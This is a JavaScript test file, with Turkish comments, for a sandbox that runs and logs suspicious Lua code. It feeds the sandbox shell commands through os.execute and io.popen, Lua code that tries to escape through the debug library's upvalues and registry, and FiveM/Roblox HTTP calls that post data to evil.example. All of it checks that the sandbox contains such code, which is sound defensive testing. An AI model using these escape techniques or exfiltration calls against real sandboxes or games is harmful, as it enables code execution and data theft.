// Sandbox öz-denetimi: node test/sandbox.test.js
// Bu Lua derlemelerinin Node sürümü os.execute'u gerçek child_process'e bağlar. Güvenlik iki katmanlıdır: prelude
// os.execute/io.popen'i kayıt tutan taklitle değiştirir; alt süreç izin modeliyle (--permission) komut çalıştıramaz.
import assert from 'node:assert/strict';
import { existsSync } from 'node:fs';
import { createNodeSandbox } from '../src/sandbox/node-host.js';

const sb = createNodeSandbox();
const canary = `${process.env.TEMP ?? '.'}/peel-lua-escape-${process.pid}.txt`.replace(/\\/g, '/');
try {
  // iç içe yükleme kaydı ve çıktı
  const r = await sb.run({ code: "local a = 'x'\nloadstring(\"b = '\" .. a .. \"y' print(b) loadstring('print(2)')()\")()\n" });
  assert.equal(r.stdout, 'xy\n2\n');
  assert.equal(r.loads.length, 2);
  assert.equal(r.loads[1].code, 'print(2)');

  // komut kaydedilir, çalışmaz (dosya oluşmamalı); ikili veri bozulmaz
  const c = await sb.run({ code: `os.execute('echo x > "${canary}"')\nlocal p = io.popen('whoami')\nprint(p == nil, ("\\0\\255"):byte(2))\n` });
  assert.equal(c.stdout, 'true\t255\n');
  assert.deepEqual(c.fx.map((f) => f[0]), ['os.execute', 'io.popen']);
  await new Promise((res) => setTimeout(res, 300));
  assert.equal(existsSync(canary), false, 'sandbox komut çalıştırmamalı');

  // Lua içi kaçış: gerçek os.execute'a debug kütüphanesiyle ulaşma denemeleri. Prelude ona referans tutmaz; tutsa
  // bile izin modeli alt süreç başlatmayı işletim sistemi düzeyinde engeller.
  const esc = await sb.run({ code: [
    'local found = 0',
    'for _, f in ipairs({print, loadstring, os.execute, io.write}) do',
    '  for i = 1, 60 do',
    '    local n, v = debug.getupvalue(f, i)',
    '    if not n then break end',
    "    if type(v) == 'table' then for k, x in pairs(v) do if type(x) == 'function' then",
    `      pcall(x, 'echo x > "${canary}"') found = found + 1`,
    '    end end end',
    '  end',
    'end',
    `local reg = debug.getregistry()`,
    `for k, v in pairs(reg) do if type(v) == 'table' and type(v.execute) == 'function' then pcall(v.execute, 'echo x > "${canary}"') end end`,
    "print('denendi')",
  ].join('\n') });
  assert.ok(esc.ok);
  await new Promise((res) => setTimeout(res, 300));
  assert.equal(existsSync(canary), false, 'debug kütüphanesiyle kaçış komut çalıştırmamalı');

  // platform taklitleri: FiveM / Roblox çağrıları kaydedilir
  const f = await sb.run({ code: "PerformHttpRequest('https://evil.example/x', function() end, 'POST', 'd')\n", platform: 'fivem' });
  assert.deepEqual(f.fx[0], ['PerformHttpRequest', ['https://evil.example/x', '<function>', 'POST', 'd']]);
  const rb = await sb.run({ code: "local s = game:HttpGet('https://evil.example/y')\nprint(type(s))\n", platform: 'roblox' });
  assert.equal(rb.stdout, 'string\n');
  assert.deepEqual(rb.fx[0], ['game.HttpGet', ['https://evil.example/y']]);

  // sonsuz döngü: komut bütçesi durdurur; bütçe aşılsa bile bekçi süreci öldürür
  const loop = await sb.run({ code: 'while true do end' });
  assert.ok(loop.timedOut);
  const after = await sb.run({ code: 'print(1 + 1)' });
  assert.equal(after.stdout, '2\n');

  // değer yakalama: değerler geçer, sabit site kaydedilir, değişen '*' olur; varyant 2'de saat farklıdır
  const cap = await sb.run({ code: "for i = 1, 2 do print(__peel_cap(1, 'k'), __peel_cap(2, i)) end\nprint(__peel_cap(3, os.time()))" });
  assert.equal(cap.stdout, 'k\t1\nk\t2\n1704067200\n');
  assert.deepEqual(cap.caps[1], { n: 1, type: 'string', value: 'k' });
  assert.equal(cap.caps[2], null);
  const cap2 = await sb.run({ code: 'print(__peel_cap(3, os.time()))', variant: 2 });
  assert.notEqual(cap2.caps[3].value, cap.caps[3].value);

  // sürümler ve değerlendirme
  assert.equal((await sb.run({ code: 'print(7 // 2)', version: '5.4' })).stdout, '3\n');
  const ev = await sb.evaluate({ exprs: ['string.char(104, 105)', '("ab"):rep(2)', 'nope()'] });
  assert.deepEqual(ev, [[true, 'string', 'hi'], [true, 'string', 'abab'], [false]]);
  console.log('sandbox: ok');
} finally {
  sb.close();
}
